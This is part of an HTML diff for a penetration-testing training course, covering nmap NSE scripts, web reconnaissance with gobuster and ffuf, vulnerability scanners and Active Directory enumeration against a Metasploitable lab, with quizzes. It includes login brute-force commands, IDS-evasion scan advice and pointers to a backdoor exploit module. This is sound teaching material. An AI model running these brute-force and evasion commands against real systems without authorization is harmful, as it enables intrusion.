+      <div class="nse-name">ftp-anon</div>
+      <div class="nse-cat">AUTH</div>
+      <div class="nse-desc">Tests if anonymous FTP login is enabled. If yes, lists files accessible without credentials. Classic misconfiguration.</div>
+      <div class="nse-cmd">nmap --script=ftp-anon -p 21 target</div>
+    </div>
+    <div class="nse-card">
+      <div class="nse-name">ssh-brute</div>
+      <div class="nse-cat">BRUTE FORCE</div>
+      <div class="nse-desc">Brute-forces SSH credentials using a wordlist. Slow but effective against weak passwords. Use with caution — creates loud log entries.</div>
+      <div class="nse-cmd">nmap --script=ssh-brute -p 22 target</div>
+    </div>
+    <div class="nse-card">
+      <div class="nse-name">http-enum</div>
+      <div class="nse-cat">DISCOVERY</div>
+      <div class="nse-desc">Enumerates common web directories and files (admin/, login.php, .htaccess, etc.). Lighter alternative to running Gobuster separately.</div>
+      <div class="nse-cmd">nmap --script=http-enum -p 80,443 target</div>
+    </div>
+    <div class="nse-card">
+      <div class="nse-name">vuln (category)</div>
+      <div class="nse-cat">VULNERABILITY</div>
+      <div class="nse-desc">Runs ALL scripts in the "vuln" category against a target. Checks for dozens of CVEs. Generates noise but gives comprehensive results.</div>
+      <div class="nse-cmd">nmap --script=vuln -sV target</div>
+    </div>
+    <div class="nse-card">
+      <div class="nse-name">smb-enum-shares</div>
+      <div class="nse-cat">DISCOVERY</div>
+      <div class="nse-desc">Lists SMB network shares and their access permissions. Misconfigured shares often expose sensitive files like backup.zip, passwords.txt.</div>
+      <div class="nse-cmd">nmap --script=smb-enum-shares -p 445 target</div>
+    </div>
+    <div class="nse-card">
+      <div class="nse-name">mysql-empty-root</div>
+      <div class="nse-cat">AUTH</div>
+      <div class="nse-desc">Checks if MySQL root account has no password — one of the most common misconfigurations on development and legacy servers.</div>
+      <div class="nse-cmd">nmap --script=mysql-empty-root -p 3306 target</div>
+    </div>
+    <div class="nse-card">
+      <div class="nse-name">ssl-heartbleed</div>
+      <div class="nse-cat">VULNERABILITY</div>
+      <div class="nse-desc">Checks for the Heartbleed vulnerability (CVE-2014-0160) in OpenSSL. Allows reading server memory — can leak private keys, session tokens, credentials.</div>
+      <div class="nse-cmd">nmap --script=ssl-heartbleed -p 443 target</div>
+    </div>
+  </div>
+
+  <div class="slbl">// 15.4 — REAL NMAP OUTPUT ANALYSIS</div>
+
+  <div class="term">
+    <div class="tbar"><div class="d dr"></div><div class="d dy"></div><div class="d dg"></div><div class="ttl">NMAP -sV -sC -O -T4 --script=vuln 192.168.56.101</div></div>
+    <div class="tbody"><span class="co">Starting Nmap 7.94 ( https://nmap.org )
+Nmap scan report for 192.168.56.101</span>
+<span class="co">Host is up (0.00031s latency).</span>
+
+PORT     STATE  SERVICE     VERSION
+<span class="hi">21/tcp   open   ftp         vsftpd 2.3.4</span>
+<span class="hw">| ftp-vsftpd-backdoor:</span>
+<span class="hw">|   VULNERABLE: vsFTPd version 2.3.4 backdoor — CVE-2011-2523</span>
+<span class="hw">|   State: VULNERABLE (Exploitable)</span>
+<span class="hw">|   Risk factor: High — connects to cmd port 6200/tcp</span>
+<span class="co">|_  References: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-2523</span>
+<span class="hi">22/tcp   open   ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)</span>
+<span class="hb">80/tcp   open   http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)</span>
+<span class="hb">| http-title: Metasploitable2 - Linux</span>
+<span class="hi">139/tcp  open   netbios-ssn Samba smbd 3.X - 4.X</span>
+<span class="hi">445/tcp  open   netbios-ssn Samba smbd 3.0.20-Debian</span>
+<span class="hw">| smb-vuln-ms08-067:</span>
+<span class="hw">|   VULNERABLE: Microsoft Windows Server Service RPC</span>
+<span class="hw">|   State: LIKELY VULNERABLE</span>
+<span class="hi">3306/tcp open   mysql       MySQL 5.0.51a-3ubuntu5</span>
+<span class="hw">| mysql-empty-root:</span>
+<span class="hw">|   root account has NO PASSWORD</span>
+
+<span class="co">OS details: Linux 2.6.X (Ubuntu 8.04)</span>
+<span class="hb">Network Distance: 1 hop</span>
+
+<span class="hw">SCRIPT RESULTS SUMMARY:
+  ↳ vsftpd 2.3.4 backdoor        → EXPLOITABLE   (you'll use this in Week 4)
+  ↳ MySQL empty root              → EXPLOITABLE   (direct DB access without auth)
+  ↳ Samba ms08-067               → LIKELY VULN   (remote code execution)
+  ↳ SSH version 4.7p1            → OUTDATED      (multiple known CVEs)</span></div>
+  </div>
+
+  <div class="note ny">
+    <div class="nico">💡</div>
+    <p><strong>Reading this output:</strong> You now have a prioritized attack roadmap. The vsftpd backdoor and MySQL empty root are both immediately exploitable — no credentials needed. In Week 4 you'll use Metasploit's <code>exploit/unix/ftp/vsftpd_234_backdoor</code> to get a shell from that FTP service in under 60 seconds.</p>
+  </div>
+
+  <div class="slbl">// DAY 15 — QUIZ</div>
+  <div class="qblock">
+    <div class="qt">You're pentesting a corporate network. The IDS has a rule: alert if more than 20 SYN packets from same source in 5 seconds. You need to scan 65535 ports without triggering it. Which nmap timing template do you use, and why might you ALSO use --scan-delay?</div>
+    <div class="qopts">
+      <div class="qo" onclick="qa(this,'wrong','T4 is Aggressive — fast but extremely loud. It would absolutely trigger the 20 SYN/5sec threshold. This is for CTF/lab environments where you don\'t care about detection.')"><span class="qk">A</span> -T4 to scan faster and get through before the IDS processes the packets</div>
+      <div class="qo" onclick="qa(this,'correct','Correct! -T1 (Sneaky) waits 15 seconds between probes by default — far below the 20 packets/5 seconds threshold. Combined with --scan-delay 2s (which adds a minimum 2-second pause between each probe), you create a scan so slow it looks like background noise. The tradeoff: scanning 65535 ports with 15-second delays takes ~11 days. In real engagements, you choose strategically which ports to scan stealthily vs. which you scan fast during agreed maintenance windows.')"><span class="qk">B</span> -T1 with --scan-delay to stay below the IDS threshold, sacrificing speed for stealth</div>
+      <div class="qo" onclick="qa(this,'wrong','NULL/FIN/Xmas scans (-sN/-sF/-sX) evade stateless firewalls that only block SYN packets, but they don\'t solve the rate-based IDS problem. A threshold rule counting any packets, not just SYN, would still trigger.')"><span class="qk">C</span> -sN (NULL scan) to avoid sending any TCP flags at all</div>
+      <div class="qo" onclick="qa(this,'wrong','-Pn skips host discovery (doesn\'t send ping before scanning). Useful when ICMP is blocked. But it doesn\'t affect how fast port probes are sent — it wouldn\'t help evade a SYN rate threshold.')"><span class="qk">D</span> -Pn to skip the ping phase which is what triggers IDS alerts</div>
+    </div>
+    <div class="qfb" id="q0"></div>
+  </div>
+
+  <div class="slbl">// DAY 15 — LAB</div>
+  <div class="card">
+    <div class="clbl">LAB TASKS</div>
+    <ul class="ck">
+      <li>Run a comprehensive scan: <code>nmap -sV -sC -O -T4 -p- 192.168.56.101 -oA week3_full_scan</code>. This is your full enumeration. Save the output — you'll reference it all week.</li>
+      <li>Run the vuln category: <code>nmap --script=vuln -sV 192.168.56.101</code>. Document every VULNERABLE finding with its CVE number.</li>
+      <li>Test NSE scripts individually: ftp-anon, smb-enum-shares, mysql-empty-root, http-enum</li>
+      <li>Try the Xmas scan: <code>nmap -sX -T2 192.168.56.101</code>. Compare open/closed/filtered results vs SYN scan. Note any differences.</li>
+      <li>Run a ping sweep of your lab network: <code>nmap -sn 192.168.56.0/24</code>. How many hosts are up?</li>
+      <li><strong>Timing experiment:</strong> Time a -T1 scan vs -T4 scan on the same ports. Document the difference.</li>
+    </ul>
+  </div>
+
+</div><!-- /p0 -->
+
+
+<!-- ════════════════ DAY 16 ════════════════ -->
+<div class="panel" id="p1">
+  <div class="dh">
+    <div class="dnum">16</div>
+    <div class="dtitle">
+      <h2>WEB RECON</h2>
+      <p><span class="stag s-tl">TOOL</span><span class="stag s-lb">LAB</span> Gobuster · ffuf · Nikto · Subdomain Enumeration · Tech Fingerprinting</p>
+    </div>
+  </div>
+
+  <div class="pbar-w">
+    <div class="pbar-l">WEEK 3 PROGRESS — DAY 16 OF 21</div>
+    <div class="pbar-t"><div class="pbar-f" style="width:76%"></div></div>
+  </div>
+
+  <div class="note ni">
+    <div class="nico">🌐</div>
+    <p><strong>Web recon finds what nmap misses.</strong> Nmap tells you a web server is running on port 80. Web recon tells you there's a hidden <code>/admin</code> panel, a <code>/backup.zip</code> file someone left accessible, a <code>/api/v2/users</code> endpoint returning all user data, and a staging subdomain running a 3-year-old vulnerable framework. The attack surface of a web app is invisible to port scanners.</p>
+  </div>
+
+  <div class="slbl">// 16.1 — THE WEB RECON WORKFLOW</div>
+
+  <div class="flow-steps">
+    <div class="flow-step">
+      <div class="fs-num">1</div>
+      <div class="fs-body">
+        <div class="fs-title">Technology Fingerprinting</div>
+        <div class="fs-desc">Before brute-forcing anything, identify what's running. Web server, framework, CMS, programming language — each has known vulnerabilities. WhatWeb and Wappalyzer do this passively.</div>
+        <div class="fs-cmd">whatweb http://target.com -v</div>
+      </div>
+    </div>
+    <div class="flow-step">
+      <div class="fs-num">2</div>
+      <div class="fs-body">
+        <div class="fs-title">Nikto — Vulnerability Surface Scan</div>
+        <div class="fs-desc">Nikto tests for 6700+ known web server issues: dangerous files, outdated software, security misconfigurations, XSS vectors, directory listings. It's noisy but fast and finds obvious holes.</div>
+        <div class="fs-cmd">nikto -h http://192.168.56.101 -output nikto_results.txt</div>
+      </div>
+    </div>
+    <div class="flow-step">
+      <div class="fs-num">3</div>
+      <div class="fs-body">
+        <div class="fs-title">Directory/File Brute Force with Gobuster</div>
+        <div class="fs-desc">Enumerate hidden directories and files using wordlists. /admin, /backup, /.git, /config, /api — none of these appear on the homepage. Only brute-force reveals them.</div>
+        <div class="fs-cmd">gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt -t 50</div>
+      </div>
+    </div>
+    <div class="flow-step">
+      <div class="fs-num">4</div>
+      <div class="fs-body">
+        <div class="fs-title">Subdomain Enumeration</div>
+        <div class="fs-desc">The main domain may be hardened but dev.target.com, staging.target.com, or api.target.com might not be. These run the same codebase but with less security focus.</div>
+        <div class="fs-cmd">gobuster dns -d target.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt</div>
+      </div>
+    </div>
+    <div class="flow-step">
+      <div class="fs-num">5</div>
+      <div class="fs-body">
+        <div class="fs-title">Parameter/Endpoint Fuzzing with ffuf</div>
+        <div class="fs-desc">After finding directories, fuzz parameters. Hidden API parameters, unlinked endpoints, and different HTTP methods (PUT, DELETE, PATCH) often expose vulnerabilities not visible in the UI.</div>
+        <div class="fs-cmd">ffuf -w wordlist.txt -u http://target.com/api/FUZZ -mc 200,301,302</div>
+      </div>
+    </div>
+    <div class="flow-step">
+      <div class="fs-num">6</div>
+      <div class="fs-body">
+        <div class="fs-title">Source Review &amp; Spider</div>
+        <div class="fs-desc">Read the page source. Look for JavaScript files with API keys, comments with internal paths, and hidden form fields. Spider the site to build a complete page map.</div>
+        <div class="fs-cmd">curl http://target.com | grep -E "src=|href=|action=" | head -40</div>
+      </div>
+    </div>
+  </div>
+
+  <div class="slbl">// 16.2 — GOBUSTER MASTERY</div>
+
+  <div class="term">
+    <div class="tbar"><div class="d dr"></div><div class="d dy"></div><div class="d dg"></div><div class="ttl">GOBUSTER — DIRECTORY ENUMERATION</div></div>
+    <div class="tbody"><span class="co"># ── DIRECTORY MODE ────────────────────────────────────────────</span>
+<span class="pr">$</span> <span class="cm">gobuster dir \
+  -u http://192.168.56.101 \
+  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
+  -t 50 \
+  -x php,html,txt,bak,zip \
+  -o gobuster_results.txt</span>
+
+<span class="co"># -u  = target URL
+# -w  = wordlist (SecLists has the best collections)
+# -t  = threads (50 is fast but not too aggressive)
+# -x  = also try these extensions for every word
+# -o  = save output</span>
+
+<span class="hi">===============================================================
+Gobuster v3.5  by OJ Reeves
+===============================================================
+
+/index.php          (Status: 200) [Size: 891]
+/admin              (Status: 301) [Size: 321] [--> /admin/]
+/cgi-bin            (Status: 301) [Size: 325] [--> /cgi-bin/]
+/phpMyAdmin         (Status: 301) [Size: 327]</span>  <span class="hw">← database admin panel!</span>
+<span class="hi">/test               (Status: 200) [Size: 5821]
+/backup.zip         (Status: 200) [Size: 48291]</span>  <span class="hw">← JACKPOT — backup file</span>
+<span class="hi">/.htaccess          (Status: 403) [Size: 287]</span>  <span class="hw">← exists but forbidden</span>
+<span class="hi">/config.php.bak     (Status: 200) [Size: 1024]</span>  <span class="hw">← backup of config (DB creds!)</span>
+
+<span class="co"># ── DNS SUBDOMAIN MODE ─────────────────────────────────────────</span>
+<span class="pr">$</span> <span class="cm">gobuster dns \
+  -d targetcorp.com \
+  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
+  -t 30</span>
+
+<span class="hi">Found: dev.targetcorp.com      [192.168.1.20]</span>    <span class="hw">← development server</span>
+<span class="hi">Found: staging.targetcorp.com  [192.168.1.25]</span>    <span class="hw">← staging server</span>
+<span class="hi">Found: jenkins.targetcorp.com  [192.168.1.30]</span>    <span class="hw">← CI/CD (high value)</span>
+<span class="hi">Found: vpn.targetcorp.com      [203.0.113.10]</span>    <span class="hw">← VPN portal</span></div>
+  </div>
+
+  <div class="slbl">// 16.3 — ffuf: THE FUZZING POWERHOUSE</div>
+
+  <div class="term">
+    <div class="tbar"><div class="d dr"></div><div class="d dy"></div><div class="d dg"></div><div class="ttl">ffuf — FUZZ FASTER U FOOL</div></div>
+    <div class="tbody"><span class="co"># ffuf uses FUZZ as a placeholder — replace it with any wordlist
+# More flexible than gobuster — can fuzz URLs, headers, params, POST bodies</span>
+
+<span class="co"># ── BASIC DIRECTORY FUZZ ──────────────────────────────────────</span>
+<span class="pr">$</span> <span class="cm">ffuf -w /usr/share/wordlists/dirb/common.txt \
+  -u http://target.com/FUZZ \
+  -mc 200,301,302,403</span>
+
+<span class="co"># ── FILTER BY SIZE (remove false positives) ───────────────────</span>
+<span class="pr">$</span> <span class="cm">ffuf -w wordlist.txt -u http://target.com/FUZZ \
+  -mc 200 -fs 1234</span>  <span class="co"># fs = filter responses of size 1234 (common false positive size)</span>
+
+<span class="co"># ── VHOST FUZZING (find virtual hosts) ───────────────────────</span>
+<span class="pr">$</span> <span class="cm">ffuf -w subdomains.txt \
+  -u http://10.10.10.100 \
+  -H "Host: FUZZ.target.com" \
+  -mc 200 -fs 10918</span>
+<span class="co"># Sends requests with different Host headers — discovers virtual hosts
+# that share the same IP but serve different content</span>
+
+<span class="co"># ── PARAMETER FUZZING ─────────────────────────────────────────</span>
+<span class="pr">$</span> <span class="cm">ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
+  -u "http://target.com/page?FUZZ=test" \
+  -mc 200 -fs 1000</span>
+<span class="co"># Finds hidden GET parameters — a parameter that shouldn't exist publicly
+# might expose debug info, user enumeration, or LFI vulnerability</span>
+
+<span class="co"># ── POST DATA FUZZING (login brute force) ─────────────────────</span>
+<span class="pr">$</span> <span class="cm">ffuf -w /usr/share/wordlists/rockyou.txt \
+  -u http://target.com/login \
+  -X POST \
+  -d "username=admin&password=FUZZ" \
+  -H "Content-Type: application/x-www-form-urlencoded" \
+  -mc 302 -fs 1234</span>
+<span class="co"># mc 302 = look for redirects (successful login usually redirects)
+# Use with CAUTION and only with authorization — this is active brute-force</span></div>
+  </div>
+
+  <div class="slbl">// 16.4 — WORDLISTS: YOUR MOST VALUABLE RESOURCE</div>
+
+  <div class="card">
+    <div class="clbl">SECLISTS — THE WORDLIST COLLECTION</div>
+    <p>SecLists (<code>apt install seclists</code> on Kali, or github.com/danielmiessler/SecLists) is the most comprehensive wordlist collection for security testing. Always use the right wordlist for the right job.</p>
+  </div>
+
+  <table class="tbl">
+    <tr><th>WORDLIST</th><th>BEST FOR</th><th>SIZE</th></tr>
+    <tr><td><code>/usr/share/seclists/Discovery/Web-Content/common.txt</code></td><td>Fast initial directory scan</td><td>4,614 entries</td></tr>
+    <tr><td><code>/usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt</code></td><td>Thorough directory brute-force</td><td>62,809 entries</td></tr>
+    <tr><td><code>/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt</code></td><td>Subdomain enumeration</td><td>5,000 entries</td></tr>
+    <tr><td><code>/usr/share/wordlists/rockyou.txt</code></td><td>Password cracking — the classic</td><td>14.3 million</td></tr>
+    <tr><td><code>/usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt</code></td><td>Fast credential stuffing</td><td>10,000 entries</td></tr>
+    <tr><td><code>/usr/share/seclists/Usernames/Names/names.txt</code></td><td>Username enumeration</td><td>10,177 entries</td></tr>
+  </table>
+
+  <div class="slbl">// DAY 16 — QUIZ</div>
+  <div class="qblock">
+    <div class="qt">Gobuster finds <code>/backup.zip (Status: 200, Size: 48291)</code> on a target web server. Rank the following actions in the correct order of what a professional pentester does next.</div>
+    <div class="qopts">
+      <div class="qo" onclick="qa(this,'wrong','You absolutely should NOT ignore this. A 200 status means the file is publicly accessible — this is an immediate critical finding. Backup files routinely contain database credentials, source code, config files, and API keys.')"><span class="qk">A</span> Ignore it — backup files are usually empty test files</div>
+      <div class="qo" onclick="qa(this,'correct','Correct professional process: (1) Download: wget http://target.com/backup.zip — confirm you can actually retrieve it. (2) Inspect: unzip -l backup.zip to see the file list without extracting. (3) Extract and analyze: look for config files (database.php, .env, config.yml), source code, credentials, and any .sql database dumps. (4) Document everything with timestamps and screenshots for your report. (5) Check for password protection — if zipped, try to crack with zip2john + john. A backup file is often the single most valuable finding in a web pentest.')"><span class="qk">B</span> Download it, inspect the file listing, extract and analyze for credentials/config files, document for report</div>
+      <div class="qo" onclick="qa(this,'wrong','Reporting without investigating means you might miss credentials in the backup that would allow full server compromise. Always fully investigate what you find.')"><span class="qk">C</span> Immediately report it to the client without downloading — it might contain sensitive data</div>
+      <div class="qo" onclick="qa(this,'wrong','Deleting files on target systems is strictly outside the scope of a pentest and could be considered destruction of evidence or unauthorized modification. Never delete anything on a target.')"><span class="qk">D</span> Delete the file — you\'ve proven the finding exists and this protects the client</div>
+    </div>
+    <div class="qfb" id="q1"></div>
+  </div>
+
+</div><!-- /p1 -->
+
+
+<!-- ════════════════ DAY 17 ════════════════ -->
+<div class="panel" id="p2">
+  <div class="dh">
+    <div class="dnum">17</div>
+    <div class="dtitle">
+      <h2>VULNERABILITY SCANNING</h2>
+      <p><span class="stag s-tl">TOOL</span><span class="stag s-lb">LAB</span> OpenVAS · Nessus · CVSS Scoring · Scan Reports</p>
+    </div>
+  </div>
+
+  <div class="pbar-w">
+    <div class="pbar-l">WEEK 3 PROGRESS — DAY 17 OF 21</div>
+    <div class="pbar-t"><div class="pbar-f" style="width:81%"></div></div>
+  </div>
+
+  <div class="note ni">
+    <div class="nico">🔬</div>
+    <p><strong>Vulnerability scanners vs manual enumeration:</strong> Scanners are automated, fast, and comprehensive — but they generate false positives and miss business-logic vulnerabilities. Manual testing finds what scanners miss. Professional pentesters use scanners to get breadth and manual techniques to get depth. You need both skills.</p>
+  </div>
+
+  <div class="slbl">// 17.1 — OpenVAS vs NESSUS</div>
+
+  <table class="tbl">
+    <tr><th>FEATURE</th><th>OpenVAS / Greenbone</th><th>Nessus (Tenable)</th></tr>
+    <tr><td>Cost</td><td><span class="hlg">Free &amp; Open Source</span></td><td>Free (Essentials, 16 IPs) or $3,990+/yr (Pro)</td></tr>
+    <tr><td>Plugin count</td><td>~70,000 checks</td><td>~175,000 checks (more comprehensive)</td></tr>
+    <tr><td>Ease of use</td><td>More complex setup</td><td>Better UI, easier to interpret</td></tr>
+    <tr><td>Industry use</td><td>Common in enterprise/gov</td><td>Industry standard, required for many compliance frameworks</td></tr>
+    <tr><td>Kali Linux</td><td>Install via <code>apt install openvas</code></td><td>Download .deb from tenable.com</td></tr>
+    <tr><td>Best for students</td><td><span class="hlg">Start here — free, powerful</span></td><td>Get Essentials for exposure to the industry standard tool</td></tr>
+  </table>
+
+  <div class="slbl">// 17.2 — CVSS: THE VULNERABILITY SCORING SYSTEM</div>
+
+  <div class="card">
+    <div class="clbl">READING CVSS v3.1 SCORES</div>
+    <p>The Common Vulnerability Scoring System gives every vulnerability a 0–10 score. As a pentester, you use CVSS to prioritize your findings. Clients care most about Critical (9.0+) and High (7.0–8.9) findings — these go on page 1 of your report.</p>
+  </div>
+
+  <table class="tbl">
+    <tr><th>SCORE RANGE</th><th>SEVERITY</th><th>TYPICAL MEANING</th><th>EXAMPLE</th></tr>
+    <tr><td style="color:var(--accent2);font-weight:700">9.0 – 10.0</td><td>CRITICAL</td><td>Remote code execution, no auth required, network exploitable</td><td>Log4Shell (10.0), EternalBlue (9.8)</td></tr>
+    <tr><td style="color:#ff7043;font-weight:700">7.0 – 8.9</td><td>HIGH</td><td>Significant impact — requires some auth or local access</td><td>SQL injection with data exfil, privesc to root</td></tr>
+    <tr><td style="color:var(--hlw);font-weight:700">4.0 – 6.9</td><td>MEDIUM</td><td>Limited impact or requires user interaction</td><td>Reflected XSS, CSRF, information disclosure</td></tr>
+    <tr><td style="color:var(--accent3);font-weight:700">0.1 – 3.9</td><td>LOW</td><td>Minimal impact, requires significant conditions</td><td>Verbose error messages, non-sensitive info leak</td></tr>
+    <tr><td style="color:var(--muted)">0.0</td><td>NONE / INFO</td><td>No impact on CIA, but worth noting</td><td>Missing security headers, outdated but unexploitable software</td></tr>
+  </table>
+
+  <div class="slbl">// 17.3 — HOW VULNERABILITY SCANNERS WORK</div>
+
+  <div class="card">
+    <div class="clbl">UNDER THE HOOD</div>
+    <p>Vulnerability scanners work in three stages: <span class="hl">discovery</span> (find hosts and services, like nmap), <span class="hl">detection</span> (match detected versions/banners against a CVE database), and <span class="hl">safe exploitation</span> (some scanners perform non-destructive PoC tests to confirm exploitability). They do NOT fully exploit — they confirm risk.</p>
+  </div>
+
+  <div class="term">
+    <div class="tbar"><div class="d dr"></div><div class="d dy"></div><div class="d dg"></div><div class="ttl">OpenVAS — SETUP & SCAN COMMANDS</div></div>
+    <div class="tbody"><span class="co"># Install and setup OpenVAS on Kali:</span>
+<span class="pr">$</span> <span class="cm">sudo apt install openvas -y</span>
+<span class="pr">$</span> <span class="cm">sudo gvm-setup</span>          <span class="co"># Initial setup — downloads NVT feed (~30 min first time)</span>
+<span class="pr">$</span> <span class="cm">sudo gvm-start</span>          <span class="co"># Start all services</span>
+<span class="pr">$</span> <span class="cm">sudo gvm-check-setup</span>    <span class="co"># Verify everything is running</span>
+
+<span class="co"># Access web UI: https://127.0.0.1:9392
+# Default credentials shown during gvm-setup</span>
+
+<span class="co"># CLI scan using gvm-cli (after setup):</span>
+<span class="pr">$</span> <span class="cm">gvm-cli --gmp-username admin --gmp-password pass socket \
+  --xml "&lt;create_target&gt;&lt;name&gt;Metasploitable&lt;/name&gt;&lt;hosts&gt;192.168.56.101&lt;/hosts&gt;&lt;/create_target&gt;"</span>
+
+<span class="co"># Using Nessus CLI (after installing Nessus Essentials):</span>
+<span class="pr">$</span> <span class="cm">sudo /etc/init.d/nessusd start</span>
+<span class="co"># Access: https://localhost:8834
+# Create scan → Basic Network Scan → Enter 192.168.56.101 → Launch</span>
+
+<span class="co"># ── Interpreting output priorities ────────────────────────────</span>
+<span class="hw">CRITICAL: vsFTPd 2.3.4 Backdoor (CVE-2011-2523)     CVSS: 10.0</span>
+<span class="hw">CRITICAL: MySQL No Password Authentication            CVSS: 9.8</span>
+<span class="co">HIGH:     OpenSSH &lt; 5.0 Multiple Vulnerabilities      CVSS: 7.5
+MEDIUM:   Apache Directory Listing Enabled             CVSS: 5.3
+LOW:      SSH Protocol Version 1 Supported             CVSS: 2.6
+INFO:     Web Server Discloses Version in Headers</span></div>
+  </div>
+
+  <div class="slbl">// 17.4 — SCANNING METHODICALLY</div>
+
+  <div class="card">
+    <div class="clbl">PROFESSIONAL SCANNING WORKFLOW</div>
+    <ul class="ck">
+      <li><strong>Phase 1 — Inventory:</strong> nmap ping sweep to discover all live hosts. Never assume you know the scope — clients often forget servers.</li>
+      <li><strong>Phase 2 — Port scan all live hosts:</strong> nmap -sV --top-ports 1000 on every host. Full port scan (-p-) on high-value targets like Domain Controllers and web servers.</li>
+      <li><strong>Phase 3 — Authenticated scan:</strong> OpenVAS/Nessus with credentials finds 3–5x more vulnerabilities than unauthenticated. Ask for a read-only service account.</li>
+      <li><strong>Phase 4 — Verify critical findings manually:</strong> Confirm every Critical/High before including in report. False positives waste client time.</li>
+      <li><strong>Phase 5 — Prioritize by exploitability:</strong> A CVSS 9.8 with no public exploit is lower priority than CVSS 7.5 with a working Metasploit module.</li>
+    </ul>
+  </div>
+
+  <div class="slbl">// DAY 17 — QUIZ</div>
+  <div class="qblock">
+    <div class="qt">Your OpenVAS scan returns 47 findings: 3 Critical, 8 High, 12 Medium, 24 Low. Your client asks "are we secure?" How do you approach this?</div>
+    <div class="qopts">
+      <div class="qo" onclick="qa(this,'wrong','Saying "not secure" without context isn\'t helpful. Every organization has vulnerabilities — the question is risk prioritization and remediation planning, not binary secure/insecure.')"><span class="qk">A</span> Tell them "not secure" and give them the full 47-finding list to fix everything immediately</div>
+      <div class="qo" onclick="qa(this,'wrong','Saying "relatively secure" with 3 Criticals is professionally indefensible. Critical findings mean there are exploitable, potentially catastrophic vulnerabilities.')"><span class="qk">B</span> Tell them they\'re "relatively secure" — 24 of 47 findings are just Low severity</div>
+      <div class="qo" onclick="qa(this,'correct','Correct professional approach: First, manually verify the 3 Critical findings — confirm they\'re exploitable (not false positives), then demonstrate impact (e.g., actually exploit in lab or produce PoC). Present a risk-ranked remediation roadmap: Critical first (remediate within 24–72 hours), then High (within 30 days), Medium (within 90 days), Low (next maintenance cycle). Explain business impact in plain language — not CVSS scores. This is what separates a professional pentest report from a raw scanner dump.')"><span class="qk">C</span> Verify the 3 Critical findings manually, demonstrate business impact, and present a risk-prioritized remediation roadmap</div>
+      <div class="qo" onclick="qa(this,'wrong','Scanner output without verification and context has limited value. Clients pay for judgment, not for running automated tools. Many scanner "Criticals" are false positives for specific environments.')"><span class="qk">D</span> Export the scanner PDF and send it — the CVSS scores explain the severity clearly enough</div>
+    </div>
+    <div class="qfb" id="q2"></div>
+  </div>
+
+</div><!-- /p2 -->
+
+
+<!-- ════════════════ DAY 18 ════════════════ -->
+<div class="panel" id="p3">
+  <div class="dh">
+    <div class="dnum">18</div>
+    <div class="dtitle">
+      <h2>ACTIVE DIRECTORY RECON</h2>
+      <p><span class="stag s-tl">TOOL</span><span class="stag s-lb">LAB</span> BloodHound · ldapdomaindump · enum4linux · SMB Enumeration</p>
+    </div>
+  </div>
+
+  <div class="pbar-w">
+    <div class="pbar-l">WEEK 3 PROGRESS — DAY 18 OF 21</div>
+    <div class="pbar-t"><div class="pbar-f" style="width:86%"></div></div>
+  </div>
+
+  <div class="note ni">
+    <div class="nico">🏰</div>
+    <p><strong>AD recon is how you map the kingdom before attacking it.</strong> Active Directory environments are complex — thousands of users, hundreds of groups, dozens of Group Policy Objects. BloodHound graphs these relationships and finds attack paths that no human would manually discover. The tool doesn't exploit AD — it reveals that the path from a standard user account to Domain Admin is three hops through misconfigured permissions.</p>
+  </div>
+
+  <div class="slbl">// 18.1 — WHAT TO ENUMERATE IN AN AD ENVIRONMENT</div>
+
+  <table class="tbl">
+    <tr><th>TARGET</th><th>WHAT YOU'RE LOOKING FOR</th><th>TOOL</th></tr>
+    <tr><td>Domain Controller IP</td><td>The crown jewel target. Everything else leads here.</td><td>nmap, nslookup, dig</td></tr>
+    <tr><td>Domain Users</td><td>Service accounts (often have weak passwords + high privs), admin accounts, disabled accounts</td><td>enum4linux, ldapdomaindump, rpcclient</td></tr>
+    <tr><td>Domain Groups</td><td>Who is in Domain Admins? Local Admins? Who can RDP? Who is in "Remote Management Users"?</td><td>BloodHound, ldapdomaindump</td></tr>
+    <tr><td>SMB Shares</td><td>File shares with sensitive docs, credentials in scripts, SYSVOL/NETLOGON for GPO scripts</td><td>smbclient, smbmap, CrackMapExec</td></tr>
+    <tr><td>Kerberoastable Accounts</td><td>Service accounts with SPNs set — their TGS tickets are offline-crackable (Week 5)</td><td>BloodHound, GetUserSPNs.py</td></tr>
+    <tr><td>AS-REP Roastable</td><td>Users with "don't require Kerberos pre-auth" — hash obtainable without credentials</td><td>GetNPUsers.py</td></tr>
+    <tr><td>ACL Misconfigurations</td><td>Users who have GenericAll/GenericWrite on another account — "path to DA"</td><td>BloodHound</td></tr>
+  </table>
+
+  <div class="slbl">// 18.2 — enum4linux — SMB AND LDAP ENUMERATION</div>
+
+  <div class="term">
+    <div class="tbar"><div class="d dr"></div><div class="d dy"></div><div class="d dg"></div><div class="ttl">enum4linux — ENUMERATE WINDOWS/SAMBA TARGETS</div></div>
+    <div class="tbody"><span class="pr">$</span> <span class="cm">enum4linux -a 192.168.56.101</span>
+<span class="co"># -a = all checks: users, shares, groups, password policy, OS info, etc.</span>
+
+<span class="co">============================================================
+|    Target: 192.168.56.101                               |
+|    Started: Mon Jan 15 14:30:00 2024                    |
+============================================================</span>
+
+<span class="hi">[*] Getting OS information</span>
+<span class="hb">OS: Unix (Samba 3.0.20-Debian)</span>
+<span class="hb">Computer name: METASPLOITABLE</span>
+
+<span class="hi">[*] Enumerating users</span>
+<span class="hb">user:[msfadmin]  rid:[0x3f2]</span>
+<span class="hb">user:[postgres]  rid:[0x3f3]</span>
+<span class="hb">user:[user]      rid:[0x3f4]</span>
+<span class="hb">user:[service]   rid:[0x3f5]</span>
+
+<span class="hi">[*] Enumerating shares</span>
+<span class="hw">Sharename     Type  Comment</span>
+<span class="hw">---------     ----  -------</span>
+<span class="hw">tmp           Disk  oh noes!</span>      <span class="hw">← accessible!</span>
+<span class="hw">opt           Disk</span>
+<span class="hw">IPC$          IPC   IPC Service</span>
+
+<span class="hi">[*] Password policy</span>
